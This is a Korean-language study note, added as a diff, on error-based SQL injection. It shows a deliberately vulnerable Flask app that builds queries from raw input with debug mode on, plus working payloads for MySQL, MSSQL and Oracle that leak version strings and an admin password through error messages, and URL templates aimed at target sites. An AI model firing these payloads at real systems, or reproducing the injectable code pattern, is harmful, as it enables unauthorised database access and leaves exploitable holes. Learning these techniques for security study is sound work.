@@ -1,0 +1,166 @@
+SQL Injection - Error Based :
+    에러 베이스는 사용자가 임의적으로 에러를 발생시켜 정보를 획득하는 공격 기법입니다.
+
+    ex)
+        from flask import Flask, request
+        import pymysql
+        
+        pp = Flask(__name__)
+        
+        def getConnection():
+            return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')
+        
+        @app.route('/' , methods=['GET'])
+        def index():
+            username = request.args.get('username')
+            sql = "select username from users where username='%s'" %username
+        
+            conn = getConnection()
+            curs = conn.cursor(pymysql.cursors.DictCursor)
+            curs.execute(sql)
+            rows = curs.fetchall()
+            conn.close()
+            
+            if(rows):
+                return "True"
+            else:
+                return "False"
+        
+        app.run(host='0.0.0.0', port=8000, debug=True)
+
+    위 코드는 debug 모드가 설정되어 있으며, 사용자의 입력 데이터가 SQL쿼리에 직접적으로 사용되어 SQL Injection 취약점이 발생하는 것을 알 수 있습니다.
+    하지만 SQL 쿼리 결과의 유무만 판단하며, 결과는 직접적으로 출력되고 있진 않습니다.
+
+    debug 모드가 설정되어 있기 때문에 SQL 쿼리 문에서 에러가 발생한다면 아래 그림과 같이 발생한 원인에 대한 에러 메시지가 노출되는 것을 확인할 수 있습니다.
+
+        "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''admin''' at line 1"
+
+    admin'를 입력하여 Syntax Error가 발생하였다는 의미의 에러입니다.
+
+    위와 같이 쿼리 결과가 직접적으로 출력되지 않으며 에러 메시지가 노출되는경우 에러 메시지를 통해 주요 정보를 노출시키는 방법들이 존재합니다.
+
+    해당 방법들을 사용하여 Error Based SQL Injection을 성공적으로 활용하기 위해서는
+    Syntax Error와 같이 DBMS에서 해당 쿼리가 실행되기 전에 검증 가능한 에러가 아닌,
+    Runtime 중에 발생하는 에러가 필요합니다.
+
+    updatexml을 이용한 error based sql injection
+
+        ex) 
+            select id from user where id=1 and updatexml(null,concat(0x3a,(우리가 실행할 쿼리),null);
+            이러한 쿼리를 사용한다면 우리는 에러를 사용하여 현재 데이터베이스 이름을 알 수 있을 것입니다.(Select database()는 우리에게 현재 데이터베이스를 리턴해 줍니다.)
+            
+            ERROR 1105 (HY000): XPATH syntax error: ':(데이터베이스 명)'
+            위에 있는 에러 구문처럼 우리는 에러를 사용하여 우리는 데이터베이스 이름을 가져올 수 있었습니다.
+            
+            위에서 사용한 구문을 응용하여 우리는 우리가 원하는 쿼리문을 실행시킬 수 있습니다. 
+            select id from user where id=1 and updatexml(null,concat(0x3a,(우리가 실행할 쿼리),null);
+            
+            위의 구문을 실행시키게 되면 
+            위에서 본 에러인 
+            ERROR 1105 (HY000): XPATH syntax error: ':(우리가 실행한 쿼리의 결과)'
+            의 형식으로 우리가 원하는 정보를 가져올 수 있을 것 입니다.
+            
+            방금 우리가 배운 기법을 상용 사이트에서 사용을 하려고 하면 이러한 방법으로 할 수 있을 것입니다.
+            www.[공격할 웹 사이트의 주소].php?id=-1' and updatexml(null,concat(0x3a,(우리가 실행할 쿼리),null)-- -
+            
+    아래 SQL 쿼리는 MySQL 에서 Error Based SQL Injection을 위해 많이 사용되는 공격 형태 중 하나입니다.
+
+        ex) 
+            SELECT extractvalue(1,concat(0x3a,version()));
+            /*
+            ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
+            */
+
+    위와 같이 에러 메시지에 중요한 정보가 같이 출력되는 것을 알 수 있습니다. 
+    해당 원리에 대해서는 extractvalue 함수의 정상적인 사용 예시를 통해 이해할 수 있습니다.
+
+        ex)
+            mysql> SELECT extractvalue('<a>test</a> <b>abcd</b>', '/a');
+            +-----------------------------------------------+
+            | extractvalue('<a>test</a> <b>abcd</b>', '/a') |
+            +-----------------------------------------------+
+            | test                                          |
+            +-----------------------------------------------+
+            1 row in set (0.00 sec)
+            mysql> SELECT extractvalue(1, ':abcd');
+            ERROR 1105 (HY000): XPATH syntax error: ':abcd'
+            # ":" 로 시작하면 올바르지 않은 XPATH 식
+
+    extractvalue 함수는 첫번째 인자에 존재하는 xml 데이터에서 두번째 인자의 XPATH 식을 통해 데이터를 추출하는 함수입니다.
+    하지만 두번째 인자에 올바르지 않은 XPATH 식을 입력하게 되면 올바르지 않은 XPATH 식이라는 에러와 함께 해당 인자가 함께 출력되기 때문에 이를 이용한 공격 기법입니다.
+
+    아래와 같이 서브 쿼리를 통해 원하는 테이블의 데이터를 추출할 수도 있습니다.
+
+        ex)
+            mysql> SELECT extractvalue(1,concat(0x3a,(SELECT password FROM users WHERE username='admin')));
+            ERROR 1105 (HY000): XPATH syntax error: ':Th1s_1s_admin_PASSW@rd'
+            
+            www.[공격할 웹 사이트의 주소].php?id=-1' and extractvalue(0x0a,concat(0x0a,concat(0x0a,(우리가 실행할 쿼리문)))-- -
+            
+    아래에서는 각 DBMS에서 Error Based SQL Injection을 위해 사용하는 주요 쿼리문들에 대한 내용입니다. 
+    DBMS의 환경에 따라 사용 가능 여부 등이 달라질 수도 있습니다.
+
+    MySQL :
+        SELECT updatexml(null,concat(0x0a,version()),null);
+        /*
+        ERROR 1105 (HY000): XPATH syntax error: '
+        5.7.29-0ubuntu0.16.04.1-log'
+        */
+        SELECT extractvalue(1,concat(0x3a,version()));
+        /*
+        ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
+        */
+        SELECT COUNT(*), CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x;
+        /*
+        ERROR 1062 (23000): Duplicate entry '5.7.29-0ubuntu0.16.04.1-log:1' for key '<group_key>'
+        */
+
+    MSSQL :
+        SELECT convert(int,@@version);
+        SELECT cast((SELECT @@version) as int);
+        /*
+        Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2014 - 12.0.2000.8 (Intel X86) 
+            Feb 20 2014 19:20:46 
+            Copyright (c) Microsoft Corporation
+            Express Edition on Windows NT 6.3 <X64> (Build 9600: ) (WOW64) (Hypervisor)
+        ' to data type int.
+        */
+
+    Oracle :
+        SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual;
+        /*
+        ORA-20000: Oracle Text error:
+        DRG-11701: thesaurus Oracle Database 18c Express Edition Release 18.0.0.0.0 - Production does not exist
+        ORA-06512: at "CTXSYS.DRUE", line 183
+        ORA-06512: at "CTXSYS.DRITHSX", line 555
+        ORA-06512: at line 1
+        */
+        
+        SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual;
+        /*
+        ORA-53044: invalid tag: ORACLE DATABASE 18C EXPRESS EDITION RELEASE 18.0.0.0.0 - PRODUCTION
+        ORA-06512: at "ORDSYS.ORDERROR", line 5
+        ORA-06512: at "ORDSYS.ORD_DICOM_ADMIN_PRV", line 1390
+        ORA-06512: at "ORDSYS.ORD_DICOM_ADMIN_PRV", line 475
+        ORA-06512: at "ORDSYS.ORD_DICOM_ADMIN_PRV", line 8075
+        ORA-06512: at "ORDSYS.ORD_DICOM", line 756
+        ORA-06512: at line 1
+        */
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
